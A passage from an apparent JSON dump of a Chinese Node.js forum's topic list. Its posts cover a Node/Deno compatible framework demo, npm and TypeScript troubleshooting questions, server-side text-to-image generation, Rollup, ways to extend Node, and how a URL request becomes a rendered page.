读取引用新文件并初始化\n        if(fs.existsSync(resolved.pathname)){\n            return new vm.SourceTextModule(fs.readFileSync(resolved.pathname).toString(), { \n                context: referencingModule.context, url: resolved.href,\n                initializeImportMeta(meta){\n                    meta.url = resolved.href\n            }});\n        }\n        throw new Error(&#96;Unable to resolve dependency: ${specifier}&#96;);\n    };\n    &#x2F;&#x2F; 加载VM的import加载器功能\n    await main.link(linker);\n    &#x2F;&#x2F; 实例化\n    main.instantiate();\n    &#x2F;&#x2F; 执行主代码\n    let mainResult = await main.evaluate();\n    let mainFunc = mainResult.result;\n    await mainFunc();\n})();\n</code></pre><h2>deno中间层方案</h2>\n<p>由于deno没有类似VM的东西所以方法是直接挂载上去的,这就偏简单了。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; engineMiddle&#x2F;deno&#x2F;mod.js deno中间层文件\nimport Http from &#x27;.&#x2F;http.js&#x27;;\nimport File from &#x27;.&#x2F;file.js&#x27;;\nimport main from &#x27;..&#x2F;..&#x2F;main.js&#x27;;\n&#x2F;*\n* 暴露给中间层代码，这仅仅是注入演示\n* 如有需要可以增加挂载方法\n* 暴露的方法和node中间层暴露保持一致就好\n*&#x2F;\nwindow.midInject = {\n    console:console,\n    Http:Http, &#x2F;&#x2F;暴露给业务层的HTTP方法和node暴露方法保持一致\n    File:File, &#x2F;&#x2F;暴露给业务层的文件操作方法和node暴露方法保持一致\n}\nmain();\n</code></pre><p>可能有人说了node你防止了业务层只能使用中间层的非中间层代码，而deno没防止。其实这个很好解决，使用分别使用node和deno都跑以下代码或测试用例就好，如果只有deno能跑通则说明使用了deno的非原生JS代码。</p>\n<h2>业务层主入口</h2>\n<p>这里通过中间层暴露全局变量midInject来暴露特权方法，这里就暴露了Http的方法，并通过暴露的Http来加载路由。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; main.js 框架的业务入口文件\n&#x2F;&#x2F; 从这里开始node和deno都开始运行同样的代码了\nimport config from &#x27;.&#x2F;config.js&#x27;;\nimport Router from &#x27;.&#x2F;router.js&#x27;;\nlet mian = (async()=&gt;{\n    const Http = midInject.Http;\n    const router = new Router();\n    const http = new Http(router.getRouterMap());\n    await http.listen(config.port);\n});\nexport default mian;\nmian;\n</code></pre><h2>业务层的使用</h2>\n<p>在其他业务层如果需要特权功能，那么也需要从注入的全局变量来获取特权功能。比如下面的文件读取功能，如果我们需要加入其他的特权功能，我们也可以通过midInject来注入新的特权功能，同时实现在不同运行时中即可。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; server&#x2F;HelloServer.js 服务层的业务文件\nexport default class HelloServer {\n    constructor () {\n        this.File = midInject.File;\n    }\n    async hello() {\n        &#x2F;&#x2F; 读取db.json 假装有数据库\n        let res = JSON.parse(await this.File.getContent(import.meta.url,&#x27;.&#x2F;db.json&#x27;));\n        return res.hello;\n    }\n}\n</code></pre><p>可能这样大家会觉得很麻烦，但事实上并不会需要实现很多功能，因为框架功能一般相对固定，增加到一定程度即可满足大家在平时的使用。所以始终要加入中间层的功能并不会很多，同时由于中间层是核心中的核心，所以可将中间层单独作为一个当前仓库的submodule，在code review中加强对中间层的管理，防止过多没必要的代码放入，导致增加新运行时中间层的迁移成本。</p>\n<h1>最后聊聊</h1>\n<p>可能很多人存在误区认为只要写ts就能使得deno和node兼容，但这种说法是不对的，deno的特权写法和node的特权写法已经有了较大的差距，包括很多API都是完全不一样，所以只通过转化成ts是不现实的。相反只要你API实现了兼容，即使你写JS，deno一样可以实现运行。</p>\n<p>由于这是做的一个DEMO版的框架，同时支持多运行时的基本思想是有了。但毕竟只是一个用于阐述思想的产物，所以很多都采取了极简模式，包括控制器和服务层都没有基类，模型层直接忽略了，没有使用工厂化生产控制器和服务层等等，同时路由目前连参数也不支持。但是对于这次关于同时兼容node和deno的服务框架的，考虑应该也是足够的。</p>\n<p><code>同时由于deno还未GA，node的试验性特性也还没有确定，请勿过早通过这样去实现兼容多运行时的框架。</code></p>\n<p>思想包括，但不限于：</p>\n<ul>\n<li>即使存在新的运行时，只要重新实现一遍中间层功能即可</li>\n<li>使用不同入口，但可以从入口保证最终实现的功能相同</li>\n<li>使用注入的方式，从暴露的中间层变量，如果使用JS之外的方法，包括http和文件读取，保证除中间层外只允许原生JS使用</li>\n</ul>\n<p>最后本文讨论旨在思想而非代码或框架的实现程度，希望大家能给出一些思想上的一些帮助而非单纯代码层面，谢谢。</p>\n</div>","title":"如何构建一个同时支持node和deno的框架","last_reply_at":"2019-03-08T03:23:34.680Z","good":false,"top":false,"reply_count":2,"visit_count":458,"create_at":"2019-03-08T02:14:28.525Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"5c81df6f5b8cb21491ca71f6","author_id":"54edd6faf08635a279d18cff","tab":"ask","content":"<div class=\"markdown-text\"><p>在一个开源项目中package.json中看到这样的写法</p>\n<pre class=\"prettyprint\"><code>&quot;devDependencies&quot;: {\n    &quot;vue-beta&quot;: &quot;npm:vue@~2.5.17-beta.0&quot;\n  },\n</code></pre><p>但在window下的gitbash中执行<code>npm i</code>会报</p>\n<pre class=\"prettyprint\"><code>npm ERR! code EUNSUPPORTEDPROTOCOL\nnpm ERR! Unsupported URL Type &quot;npm:&quot;: npm:vue@~2.5.17-beta.0\n</code></pre></div>","title":"\"vue-beta\": \"npm:vue@~2.5.17-beta.0\" 这是什么写法","last_reply_at":"2019-03-08T03:20:15.209Z","good":false,"top":false,"reply_count":0,"visit_count":301,"create_at":"2019-03-08T03:20:15.209Z","author":{"loginname":"nqdy666","avatar_url":"https://avatars2.githubusercontent.com/u/5211893?v=4&s=120"}},{"id":"5c80e8d090c14711cc8cb40d","author_id":"54d8560c6a95c42f404f7e25","tab":"ask","content":"<div class=\"markdown-text\"><p>一段包含async方法的ts代码:\n转译后,会生成包含下面代码片段的es5代码:</p>\n<pre class=\"prettyprint language-TypeScript\"><code>var __extends = this &amp;&amp; this.__extends || function () {\n    var _extendStatics = function extendStatics(d, b) {\n        _extendStatics = __WEBPACK_IMPORTED_MODULE_7_babel_runtime_core_js_object_set_prototype_of___default.a || { __proto__: [] } instanceof Array &amp;&amp; function (d, b) {\n            d.__proto__ = b;\n        } || function (d, b) {\n            for (var p in b) {\n                if (b.hasOwnProperty(p)) d[p] = b[p];\n            }\n        };\n        return _extendStatics(d, b);\n    };\n    return function (d, b) {\n        _extendStatics(d, b);\n        function __() {\n            this.constructor = d;\n        }\n        d.prototype = b === null ? __WEBPACK_IMPORTED_MODULE_6_babel_runtime_core_js_object_create___default()(b) : (__.prototype = b.prototype, new __());\n    };\n}();\nvar __decorate = this &amp;&amp; this.__decorate || function (decorators, target, key, desc) {\n    var c = arguments.length,\n        r = c &lt; 3 ? target : desc === null ? desc = __WEBPACK_IMPORTED_MODULE_5_babel_runtime_core_js_object_get_own_property_descriptor___default()(target, key) : desc,\n        d;\n    if ((typeof Reflect === &quot;undefined&quot; ? &quot;undefined&quot; : __WEBPACK_IMPORTED_MODULE_4_babel_runtime_helpers_typeof___default()(Reflect)) === &quot;object&quot; &amp;&amp; typeof Reflect.decorate === &quot;function&quot;) r = Reflect.decorate(decorators, target, key, desc);else for (var i = decorators.length - 1; i &gt;= 0; i--) {\n        if (d = decorators[i]) r = (c &lt; 3 ? d(r) : c &gt; 3 ? d(target, key, r) : d(target, key)) || r;\n    }return c &gt; 3 &amp;&amp; r &amp;&amp; __WEBPACK_IMPORTED_MODULE_3_babel_runtime_core_js_object_define_property___default()(target, key, r), r;\n};\nvar __awaiter = this &amp;&amp; this.__awaiter || function (thisArg, _arguments, P, generator) {\n    return new (P || (P = __WEBPACK_IMPORTED_MODULE_2_babel_runtime_core_js_promise___default.a))(function (resolve, reject) {\n        function fulfilled(value) {\n            try {\n                step(generator.next(value));\n            } catch (e) {\n                reject(e);\n            }\n        }\n        function rejected(value) {\n            try {\n                step(generator[&quot;throw&quot;](value));\n            } catch (e) {\n                reject(e);\n            }\n        }\n        function step(result) {\n            result.done ? resolve(result.value) : new P(function (resolve) {\n                resolve(result.value);\n            }).then(fulfilled, rejected);\n        }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __generator = this &amp;&amp; this.__generator || function (thisArg, body) {\n    var _ = { label: 0, sent: function sent() {\n            if (t[0] &amp; 1) throw t[1];return t[1];\n        }, trys: [], ops: [] },\n        f,\n        y,\n        t,\n        g;\n    return g = { next: verb(0), &quot;throw&quot;: verb(1), &quot;return&quot;: verb(2) }, typeof __WEBPACK_IMPORTED_MODULE_1_babel_runtime_core_js_symbol___default.a === &quot;function&quot; &amp;&amp; (g[__WEBPACK_IMPORTED_MODULE_0_babel_runtime_core_js_symbol_iterator___default.a] = function () {\n        return this;\n    }), g;\n    function verb(n) {\n        return function (v) {\n            return step([n, v]);\n        };\n    }\n    function step(op) {\n        if (f) throw new TypeError(&quot;Generator is already executing.&quot;);\n        while (_) {\n            try {\n                if (f = 1, y &amp;&amp; (t = op[0] &amp; 2 ? y[&quot;return&quot;] : op[0] ? y[&quot;throw&quot;] || ((t = y[&quot;return&quot;]) &amp;&amp; t.call(y), 0) : y.next) &amp;&amp; !(t = t.call(y, op[1])).done) return t;\n                if (y = 0, t) op = [op[0] &amp; 2, t.value];\n                switch (op[0]) {\n                    case 0:case 1:\n                        t = op;break;\n                    case 4:\n                        _.label++;return { value: op[1], done: false };\n                    case 5:\n                        _.label++;y = op[1];op = [0];continue;\n                    case 7:\n                        op = _.ops.pop();_.trys.pop();continue;\n                    default:\n                        if (!(t = _.trys, t = t.length &gt; 0 &amp;&amp; t[t.length - 1]) &amp;&amp; (op[0] === 6 || op[0] === 2)) {\n                            _ = 0;continue;\n                        }\n                        if (op[0] === 3 &amp;&amp; (!t || op[1] &gt; t[0] &amp;&amp; op[1] &lt; t[3])) {\n                            _.label = op[1];break;\n                        }\n                        if (op[0] === 6 &amp;&amp; _.label &lt; t[1]) {\n                            _.label = t[1];t = op;break;\n                        }\n                        if (t &amp;&amp; _.label &lt; t[2]) {\n                            _.label = t[2];_.ops.push(op);break;\n                        }\n                        if (t[2]) _.ops.pop();\n                        _.trys.pop();continue;\n                }\n                op = body.call(thisArg, _);\n            } catch (e) {\n                op = [6, e];y = 0;\n            } finally {\n                f = t = 0;\n            }\n        }if (op[0] &amp; 5) throw op[1];return { value: op[0] ? op[1] : void 0, done: true };\n    }\n};\n</code></pre><p>其中:</p>\n<pre class=\"prettyprint\"><code>catch (e) {\n                op = [6, e];y = 0;\n            }\n</code></pre><p>这段是什么意思,我今天调试发现我async方法中其实报了个空指针,但控制台没有任何迹象,调试后才发现被抓了,而且没有任何处理,这是ts的什么配置来控制的吗?感觉这样不合理吧.</p>\n</div>","title":"为什么TypeScript转译后,自行帮我处理了async方法中的异常?","last_reply_at":"2019-03-08T02:42:14.829Z","good":false,"top":false,"reply_count":2,"visit_count":441,"create_at":"2019-03-07T09:48:00.173Z","author":{"loginname":"JsonSong89","avatar_url":"https://avatars1.githubusercontent.com/u/4394916?v=4&s=120"}},{"id":"583c5d9fba57ffba06c24a89","author_id":"574baf9e991011691ef17ca6","tab":"share","content":"<div class=\"markdown-text\"><h2>为啥要搞这玩意？</h2>\n<p>今天老板提了需求，要在服务端生成邀请卡，嗯…，简单的说就是把要这张：\n<img src=\"//static.cnodejs.org/Fvbe3rk65Xd6tLEJcYSgQLt6J2up\" alt=\"webwxgetmsgimg.jpg\">\n变成差多这样的：\n<img src=\"//static.cnodejs.org/FpN6RbDjbnz2fzxsqo-PinRK-5LX\" alt=\"card.png\">\n后端搞ruby的哥们搞了个html转图片，说转得太慢了，我就把这坑接下来了\n所以睡前就倒腾了下，搞了个简单的实现</p>\n<h2>解决思路</h2>\n<p>文字转svg -&gt; svg转png -&gt; 合并图片</p>\n<h2>相关轮子</h2>\n<ul>\n<li>images Node.js 轻量级跨平台图像编解码库，不需要额外安装依赖</li>\n<li>text-to-svg  文字转svg</li>\n<li>svg2png svg转png图片</li>\n</ul>\n<h2>示例代码</h2>\n<pre class=\"prettyprint\"><code>&#x27;use strict&#x27;;\n\nconst fs = require(&#x27;fs&#x27;);\nconst images = require(&#x27;images&#x27;);\nconst TextToSVG = require(&#x27;text-to-svg&#x27;);\nconst svg2png = require(&quot;svg2png&quot;);\nconst Promise = require(&#x27;bluebird&#x27;);\n\nPromise.promisifyAll(fs);\n\nconst textToSVG = TextToSVG.loadSync(&#x27;fonts&#x2F;文泉驿微米黑.ttf&#x27;);\n\nconst sourceImg = images(&#x27;.&#x2F;i&#x2F;webwxgetmsgimg.jpg&#x27;);\nconst sWidth = sourceImg.width();\nconst sHeight = sourceImg.height();\n\nconst svg1 = textToSVG.getSVG(&#x27;魏长青-人人讲App&#x27;, {\n  x: 0,\n  y: 0,\n  fontSize: 24,\n  anchor: &#x27;top&#x27;,\n});\n\nconst svg2 = textToSVG.getSVG(&#x27;邀请您参加&#x27;, {\n  x: 0,\n  y: 0,\n  fontSize: 16,\n  anchor: &#x27;top&#x27;,\n});\n\nconst svg3 = textToSVG.getSVG(&#x27;人人讲课程&#x27;, {\n  x: 0,\n  y: 0,\n  fontSize: 32,\n  anchor: &#x27;top&#x27;,\n});\n\nPromise.coroutine(function* generateInvitationCard() {\n  const targetImg1Path = &#x27;.&#x2F;i&#x2F;1.png&#x27;;\n  const targetImg2Path = &#x27;.&#x2F;i&#x2F;2.png&#x27;;\n  const targetImg3Path = &#x27;.&#x2F;i&#x2F;3.png&#x27;;\n  const targetImg4Path = &#x27;.&#x2F;i&#x2F;qrcode.jpg&#x27;;\n  const [buffer1, buffer2, buffer3] = yield Promise.all([\n    svg2png(svg1),\n    svg2png(svg2),\n\tsvg2png(svg3),\n  ]);\n\n  yield Promise.all([\n    fs.writeFileAsync(targetImg1Path, buffer1),\n    fs.writeFileAsync(targetImg2Path, buffer2),\n    fs.writeFileAsync(targetImg3Path, buffer3),\n  ]);\n\n  const target1Img = images(targetImg1Path);\n  const t1Width = target1Img.width();\n  const t1Height = target1Img.height();\n  const offsetX1 = (sWidth - t1Width) &#x2F; 2;\n  const offsetY1 = 200;\n\n  const target2Img = images(targetImg2Path);\n  const t2Width = target2Img.width();\n  const t2Height = target2Img.height();\n  const offsetX2 = (sWidth - t2Width) &#x2F; 2;\n  const offsetY2 = 240;\n\n  const target3Img = images(targetImg3Path);\n  const t3Width = target3Img.width();\n  const t3Height = target3Img.height();\n  const offsetX3 = (sWidth - t3Width) &#x2F; 2;\n  const offsetY3 = 270;\n\n  const target4Img = images(targetImg4Path);\n  const t4Width = target4Img.width();\n  const t4Height = target4Img.height();\n  const offsetX4 = (sWidth - t4Width) &#x2F; 2;\n  const offsetY4 = 400;\n\n  images(sourceImg)\n  .draw(target1Img, offsetX1, offsetY1)\n  .draw(target2Img, offsetX2, offsetY2)\n  .draw(target3Img, offsetX3, offsetY3)\n  .draw(target4Img, offsetX4, offsetY4)\n  .save(&#x27;.&#x2F;i&#x2F;card.png&#x27;, { quality : 90 });\n})().catch(e =&gt; console.error(e));\n</code></pre><h2>注意事项</h2>\n<ul>\n<li>text-to-svg需要中文字体的支持，不然中文会乱码</li>\n</ul>\n<p>在我的破电脑上执行一次只花了500多毫秒，感觉足够了，分享出来希望能给大家一个参照\n厚脸皮的问一下，能加个精不？😂</p>\n</div>","title":"node文字转图片","last_reply_at":"2019-03-08T01:33:45.839Z","good":true,"top":false,"reply_count":11,"visit_count":6373,"create_at":"2016-11-28T16:38:55.229Z","author":{"loginname":"Amastyer","avatar_url":"https://avatars1.githubusercontent.com/u/12872492?v=4&s=120"}},{"id":"5c8078fa5b8cb21491ca6b16","author_id":"58058ff1487e1e4578afb5c2","tab":"ask","content":"<div class=\"markdown-text\"><p>开发的时候没有任何问题，但是打包后，报错：我的shell 脚本找不到，我已经放在了electron-vue的static目录下了，但是无法执行，是为什么呢？麻烦大佬们指点一下</p>\n</div>","title":"如何使用electron-vue实现 打开mac terminal 并且执行一段脚本","last_reply_at":"2019-03-08T00:59:24.405Z","good":false,"top":false,"reply_count":2,"visit_count":441,"create_at":"2019-03-07T01:50:50.020Z","author":{"loginname":"luanxuechao","avatar_url":"https://avatars1.githubusercontent.com/u/13465762?v=4&s=120"}},{"id":"5c7f7bcc5b8cb21491ca67e7","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>最近接入企业微信,在接入的过程中需要验证可信域名归属,验证方法如下图:</p>\n<p><img src=\"//static.cnodejs.org/Fsc-sq7h-nb-nJyE0tDh4XpFk97J\" alt=\"20190306154522.jpg\"></p>\n<p>本以为很简单的操作(以前在Java也做过类似的操作),但是我把文件放入网站根目录后,访问http://nebula.lnlzy.cn/WW_verify_wXmuFehhPi5HhoJl.txt,提示404,好像node.js的地址必须经过路由?那现在有没有办法能让我验证成功啊?</p>\n</div>","title":"express框架如何读取根目录下的.txt文件","last_reply_at":"2019-03-07T12:28:46.616Z","good":false,"top":false,"reply_count":6,"visit_count":699,"create_at":"2019-03-06T07:50:36.237Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c80e60f90c14711cc8cb3e0","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>命令模式一直强调client和命令具体执行者recever是解耦的，是互不关心的。但是看类图，client是依赖invoker和recever的，特别是recever需要client自己创建。这怎么能说是解耦呢。创建recever的代码已经入侵到client的代码中去了。\n<img src=\"//static.cnodejs.org/FluYKvX0n2Gdj2lUinuYdJVmO_ta\" alt=\"image.png\"></p>\n</div>","title":"设计模式-命令模式","last_reply_at":"2019-03-07T09:36:15.279Z","good":false,"top":false,"reply_count":0,"visit_count":396,"create_at":"2019-03-07T09:36:15.279Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5c80b7fb5b8cb21491ca6cf3","author_id":"52315f12101e574521d9d5a4","tab":"ask","content":"<div class=\"markdown-text\"><p>{\n“name”: “app-server”,\n“version”: “3.0.0”,\n“scripts”: {\n“move-server”: “bash -c “cp app/server-v${npm_package_version}.apk ./apks/server.apk””\n}\n}<br>\nyarn move-server  报错:\ncp: cannot stat ‘app/server-v.apk’: No such file or directory</p>\n<p>原因是:\n无法获取npm_package_version的值3.0.0,怎么解决</p>\n</div>","title":"win10系统执行npm script \"bash -c \\\"cp app/server-v${npm_package_version}.apk ./apks/server.apk\\\"\"报错","last_reply_at":"2019-03-07T06:42:06.499Z","good":false,"top":false,"reply_count":1,"visit_count":277,"create_at":"2019-03-07T06:19:39.208Z","author":{"loginname":"canfeit","avatar_url":"//gravatar.com/avatar/8eb166fba5699f0050cd75b8962bb7ff?size=48"}},{"id":"5c80b1e35b8cb21491ca6cc3","author_id":"5a77fac6afa0a121784a9300","tab":"ask","content":"<div class=\"markdown-text\"><p>需求是我需要在服务端渲染一段vue，但是我升级到webpack4之后会发现个别的css类的loader会去用到document或者window对象，导致渲染出错，所以我的想法是，做两个entry，一个给客户端，一个给服务端，当entry为服务端时，不去加css类的loader，求教</p>\n</div>","title":"问一个关于webpack entry和loader的问题，如何才能给不同的entry用不同的loader","last_reply_at":"2019-03-07T05:53:39.533Z","good":false,"top":false,"reply_count":0,"visit_count":276,"create_at":"2019-03-07T05:53:39.533Z","author":{"loginname":"jiyarong","avatar_url":"https://avatars2.githubusercontent.com/u/8100962?v=4&s=120"}},{"id":"5c80995790c14711cc8cb222","author_id":"5a4b643f7b5fe91a4a678900","tab":"share","content":"<div class=\"markdown-text\"><p>写好了一个项目，是不是在为readme发愁？最近在看不同的项目，总结了一套模板，大家可以拿去改一下~\n<a href=\"https://juejin.im/post/5c7d2b366fb9a049a62d5194\">https://juejin.im/post/5c7d2b366fb9a049a62d5194</a>\n<a href=\"https://github.com/yokiyokiyoki/readme-template\">github地址</a>\n再推荐一个<a href=\"https://github.com/noffle/art-of-readme/blob/master/README-zh.md\">readme的艺术</a></p>\n</div>","title":"README模板（附带英文）","last_reply_at":"2019-03-07T04:08:55.057Z","good":false,"top":false,"reply_count":0,"visit_count":507,"create_at":"2019-03-07T04:08:55.057Z","author":{"loginname":"yokiyokiyoki","avatar_url":"https://avatars3.githubusercontent.com/u/20388810?v=4&s=120"}},{"id":"5c80936890c14711cc8cb1ea","author_id":"5a80f10e99ef9fac6b2e6922","tab":"ask","content":"<div class=\"markdown-text\"><p>请问我最近重装node -v 10.15.3这个版本后，npm install的时候报这个错误npm ERR! asyncWrite is not a function，是怎么回事。\n备注：在windows操作系统下，c盘的npm目录和node安装目录都清空后重新安装的都不行。</p>\n</div>","title":"请教关于npm install 报错的问题","last_reply_at":"2019-03-07T03:43:36.871Z","good":false,"top":false,"reply_count":0,"visit_count":375,"create_at":"2019-03-07T03:43:36.871Z","author":{"loginname":"kejunliang","avatar_url":"https://avatars1.githubusercontent.com/u/25604373?v=4&s=120"}},{"id":"5c7f59fc5b8cb21491ca6671","author_id":"589a8f845dfbcdfa083b4073","tab":"share","content":"<div class=\"markdown-text\"><p><strong>抛砖引玉 ^ ^</strong></p>\n<h2>介绍</h2>\n<p>Rollup 和 webpack 一样也是一款打包工具，但是他们之间用途不同 Rollup 更倾向于类库的打包，Vue，Ember，Preact，D3，Three.js，Moment 以及其他许多知名的库也使用 Rollup。</p>\n<h2>项目地址</h2>\n<p>github：<a href=\"https://github.com/rollup/rollup\">https://github.com/rollup/rollup</a></p>\n<h2>概述</h2>\n<p>Rollup 是一个 JavaScript 模块打包器，可以将小块代码编译成大块复杂的代码，例如 library 或应用程序。Rollup 对代码模块使用新的标准化格式，这些标准都包含在 JavaScript 的 ES6 版本中，而不是以前的特殊解决方案，如 CommonJS 和 AMD。ES6 模块可以使你自由、无缝地使用你最喜爱的 library 中那些最有用独立函数，而你的项目不必携带其他未使用的代码。ES6 模块最终还是要由浏览器原生实现，但当前 Rollup 可以使你提前体验。</p>\n<h2>脚手架</h2>\n<p>附上我自己搭建的rollup-bable-template脚手架，如果你想写类库可以直接clone下来修改，如果对你有帮助还请给个star。\ngithub：<a href=\"https://github.com/lisniuse/rollup-babel-template\">https://github.com/lisniuse/rollup-babel-template</a></p>\n</div>","title":"开源类库打包工具rollup，vue也用它。","last_reply_at":"2019-03-06T14:57:24.522Z","good":false,"top":false,"reply_count":2,"visit_count":481,"create_at":"2019-03-06T05:26:20.165Z","author":{"loginname":"lisniuse","avatar_url":"https://avatars3.githubusercontent.com/u/7500988?v=4&s=120"}},{"id":"5c7ca27e5b8cb21491ca58a2","author_id":"56276af03f017c2b49b41575","tab":"ask","content":"<div class=\"markdown-text\"><p>有些 node 包用了 es modules 特性，比如 <a href=\"https://github.com/caolan/async\">async</a>  <a href=\"https://github.com/bitinn/node-fetch\">node-fetch</a></p>\n<p>我把这些项目 clone 到本地，希望能本地调试，看了下文档也没本地开发的说明，package.json 中也木有。想请教下如何 clone 到本地后能调试？谢谢🙏</p>\n</div>","title":"请教下 node 包源码中用了 es modules，clone 下来一般如何本地运行？","last_reply_at":"2019-03-06T14:36:54.691Z","good":false,"top":false,"reply_count":12,"visit_count":565,"create_at":"2019-03-04T03:58:54.416Z","author":{"loginname":"hanzichi","avatar_url":"https://avatars3.githubusercontent.com/u/10890665?v=4&s=120"}},{"id":"5c7fd85c5b8cb21491ca6a2f","author_id":"5c7fb1e190c14711cc8caf57","tab":"share","content":"<div class=\"markdown-text\"><h4>一,通过网络与第三方交互<a href=\"https://nodejs.org/api/net.html\">net</a></h4>\n<h4>二,通过子进程<a href=\"https://nodejs.org/api/child_process.html\">child_process</a></h4>\n<p>可用方法分别是exec,spawn,fork,其中exec是对spawn的封装\n<code>require('child_process').exec('grep -nr somestring ./');</code></p>\n<h4>三,引用编译成的二进制链接库,lib/dll(windows下)</h4>\n<p>通过<a href=\"https://github.com/node-ffi/node-ffi\">node-ffi</a>引用\n支持得语言c/c++,rust,golang\nwindows下支持两套c环境,msvs和gnu; golang支持得好像只有gnu,通过调用CShare,<a href=\"https://github.com/vladimirvivien/go-cshared-examples\">go-cshared-examples</a>\nc#在windows下编译成的dll不算;</p>\n<h4>四, npm i <a href=\"https://github.com/agracio/edge-js\">edge-js</a></h4>\n<p>Run .NET and Node.js code in-process on Windows, MacOS, and Linux\n利用.NET得CLR跨语言集成;支持多种脚本 异步调用\n默认依赖edge-cs,与c#交互,可以调用C#编译成得dll,或者cs文件;或者string类型的c#代码; windows上默认支持的是c#5语法,即.NET4.5\n也已支持dotnet core; c#7语法,demo地址:<a href=\"https://github.com/agracio/edge-js-quick-start\">edge-js-quick-start</a>;\ndotnet core可以打包运行时,跨平台交叉编译\n同时可以扩展支持<strong>python</strong>,F#,powershell语言的直接交互;只需要额外安装依赖<strong>edge-py</strong>,edge-fs,edge-ps</p>\n<h4>五,引用编译成的.node</h4>\n<p>1,<a href=\"https://nodejs.org/api/addons.html\">nan接口</a>;每次node升级版本,插件也要跟着再编译;\n2,<a href=\"https://nodejs.org/api/n-api.html\">NAPI</a>; 版本8是推出得新接口,目前状态:Stability: 2 - Stable</p>\n<ul>\n<li>以C风格提供稳定ABI接口</li>\n<li>消除nodejs版本差异</li>\n</ul>\n<p><em>因为可以从c代码里调用go函数,那么用go编写.node扩展也是可能的;<a href=\"https://stackoverflow.com/questions/6125683/call-go-functions-from-c\">Call Go functions from C</a></em>\n<strong>C/CPP</strong> npm install -g <a href=\"https://github.com/nodejs/node-gyp\">node-gyp</a> , <a href=\"https://nodejs.org/api/n-api.html\">NAPI</a>\n<strong>rust</strong> npm i -g <a href=\"https://neon-bindings.com/\"><strong>neon-cli</strong></a> demos地址:<a href=\"https://github.com/neon-bindings/examples\">examples</a></p>\n<blockquote>\n<p>一个对node用户非常友好的rust入门:<a href=\"https://github.com/Mercateo/rust-for-node-developers\">rust-for-node-developers</a></p>\n</blockquote>\n<hr>\n<h5>提高js/ts自身的执行效率(不一定)</h5>\n<p>把写的TypScript编译成WebAssembly后再引入代码里; 工具:<a href=\"https://gitee.com/mirrors/AssemblyScript\">AssemblyScript</a>;\n运行前把项目给编译成二进制 工具:<a href=\"https://github.com/zeit/pkg\">pkg</a></p>\n</div>","title":"提高node能力上限的办法","last_reply_at":"2019-03-06T14:25:32.021Z","good":false,"top":false,"reply_count":0,"visit_count":564,"create_at":"2019-03-06T14:25:32.021Z","author":{"loginname":"whiter001","avatar_url":"https://avatars0.githubusercontent.com/u/19288411?v=4&s=120"}},{"id":"5c7742a2a667ed6d807b9f36","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 经典面试题。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017184701\">从 URL 输入到页面展现到底发生什么？</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/langlixingzhou\">浪里行舟</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<h3>前言</h3>\n<p>打开浏览器从输入网址到网页呈现在大家面前，背后到底发生了什么？经历怎么样的一个过程？先给大家来张总体流程图，具体步骤请看下文分解！</p>\n<p>本文首发地址为<a href=\"https://github.com/ljianshu/Blog\">GitHub 博客</a>，写文章不易，请多多支持与关注！</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-01.png\" alt></p>\n<p>总体来说分为以下几个过程:</p>\n<ul>\n<li>DNS 解析:将域名解析成 IP 地址</li>\n<li>TCP 连接：TCP 三次握手</li>\n<li>发送 HTTP 请求</li>\n<li>服务器处理请求并返回 HTTP 报文</li>\n<li>浏览器解析渲染页面</li>\n<li>断开连接：TCP 四次挥手</li>\n</ul>\n<h3>一、URL 到底是啥</h3>\n<p>URL（Uniform Resource Locator），统一资源定位符，用于定位互联网上资源，俗称网址。比如 <a href=\"http://www.w3school.com.cn/html/index.asp\">http://www.w3school.com.cn/ht…</a>，遵守以下的语法规则：</p>\n<pre class=\"prettyprint language-javascript\"><code>scheme:&#x2F;&#x2F;host.domain:port&#x2F;path&#x2F;filename\n</code></pre><p>各部分解释如下：</p>\n<ul>\n<li>scheme - 定义因特网服务的类型。常见的协议有 http、https、ftp、file，其中最常见的类型是 http，而 https 则是进行加密的网络传输。</li>\n<li>host - 定义域主机（http 的默认主机是 www）</li>\n<li>domain - 定义因特网<strong>域名</strong>，比如 <a href=\"http://w3school.com.cn\">w3school.com.cn</a></li>\n<li>port - 定义主机上的端口号（http 的默认端口号是 80）</li>\n<li>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</li>\n<li>filename - 定义文档/资源的名称</li>\n</ul>\n<h3>二、域名解析（DNS）</h3>\n<p>在浏览器输入网址后，首先要经过域名解析，因为浏览器并不能直接通过域名找到对应的服务器，而是要通过 IP 地址。大家这里或许会有个疑问----计算机既可以被赋予 IP 地址，也可以被赋予主机名和域名。比如 <code>www.hackr.jp</code>。那怎么不一开始就赋予个 IP 地址？这样就可以省去解析麻烦。我们先来了解下什么是 IP 地址</p>\n<h4>1. IP 地址</h4>\n<p>IP 地址是指互联网协议地址，是 IP Address 的缩写。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。IP 地址是一个 32 位的二进制数，比如 127.0.0.1 为本机 IP。</p>\n<p>域名就相当于 IP 地址乔装打扮的伪装者，带着一副面具。它的作用就是便于记忆和沟通的一组服务器的地址。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问。因为与 IP 